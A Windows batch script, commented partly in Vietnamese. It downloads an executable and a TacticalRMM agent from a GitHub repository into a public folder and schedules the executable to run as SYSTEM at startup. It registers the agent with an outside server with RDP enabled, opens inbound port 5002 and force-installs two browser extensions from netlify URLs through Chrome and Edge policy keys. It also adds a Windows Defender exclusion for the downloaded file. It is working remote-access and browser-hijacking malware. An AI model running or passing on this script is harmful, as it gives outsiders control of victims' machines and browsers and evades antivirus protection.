@echo off
setlocal enabledelayedexpansion

:: === Kill monitorUrlnew.exe if running ===
powershell -Command "Get-Process monitorUrlnew -ErrorAction SilentlyContinue | Stop-Process -Force"

:: === Configuration ===
set "URL=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/monitorurlnew.exe"
set "TARGET_DIR=C:\Users\Public"
set "TARGET_FILE=monitorUrlnew.exe"
set "TASK_NAME=MonitorUrlTask"

:: === Create target directory if it doesn't exist ===
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: === Disable IPv6 properly on all network adapters ===
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -PassThru -ErrorAction SilentlyContinue }"

:: === Delete old file if it exists ===
if exist "%TARGET_DIR%\%TARGET_FILE%" (
    del /f /q "%TARGET_DIR%\%TARGET_FILE%"
)

:: === Download monitorUrlnew.exe ===
where curl >nul 2>&1
if %errorlevel%==0 (
    curl -L -o "%TARGET_DIR%\%TARGET_FILE%" "%URL%"
) else (
    bitsadmin /transfer myDownloadJob /download /priority normal "%URL%" "%TARGET_DIR%\%TARGET_FILE%"
)

:: === Download tacticalagent-v2.9.1-windows-amd64.exe ===
set "AGENT_URL=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/tacticalagent-v2.9.1-windows-amd64.exe"
set "AGENT_FILE=%TARGET_DIR%\tacticalagent-v2.9.1-windows-amd64.exe"
if exist "%AGENT_FILE%" (
    del /f /q "%AGENT_FILE%"
)
if %errorlevel%==0 (
    curl -L -o "%AGENT_FILE%" "%AGENT_URL%"
) else (
    bitsadmin /transfer myAgentDownload /download /priority normal "%AGENT_URL%" "%AGENT_FILE%"
)

:: === Delete existing task if it exists ===
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    schtasks /delete /tn "%TASK_NAME%" /f
)

:: === Create new scheduled task to run as SYSTEM at startup ===
schtasks /create ^
    /tn "%TASK_NAME%" ^
    /tr "%TARGET_DIR%\%TARGET_FILE%" ^
    /sc onstart ^
    /ru "SYSTEM" ^
    /f

:: === Gỡ TacticalAgent cũ (nếu có) và cài lại ===
"C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT
%AGENT_FILE% /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP- /SILENT && ping 127.0.0.1 -n 5 && "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://cchapi.reliavn.top --client-id 1 --site-id 1 --agent-type workstation --auth 916c8091f216f2946c6f810c75c7ddf52289839e0b83eef9fe29d5d34e770b4a --rdp --ping --power --silent

:: === Mở port 5002 TCP và UDP trên Firewall ===
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"

powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -Direction Inbound -Protocol TCP -LocalPort 5002 -Action Allow"
powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -Direction Inbound -Protocol UDP -LocalPort 5002 -Action Allow"

:: === XÓA registry extension cũ (nếu có) ===
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /f >nul 2>&1

:: === Add Chrome Extension policies to registry ===
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f

:: === Add Edge Extension policies to registry ===
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f

REM === Chạy lệnh PowerShell để set Mesh Agent sang Manual ===
powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"

:: === Thêm vào danh sách ngoại lệ Defender trước khi hỏi restart ===
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"

:: === Xác nhận khởi động lại bằng popup PowerShell ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
$result = [System.Windows.Forms.MessageBox]::Show('Khởi động lại máy để hoàn tất cài đặt?', 'Yêu cầu khởi động lại', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question); ^
if ($result -eq [System.Windows.Forms.DialogResult]::Yes) { ^
Start-Sleep -Seconds 3; shutdown /r /t 10 /c 'Máy sẽ khởi động lại để hoàn tất cài đặt.' ^
} else { ^
Start-Process -FilePath 'C:\Users\Public\monitorUrlnew.exe' }"
echo Done all setup. Exiting script...
exit /b 0

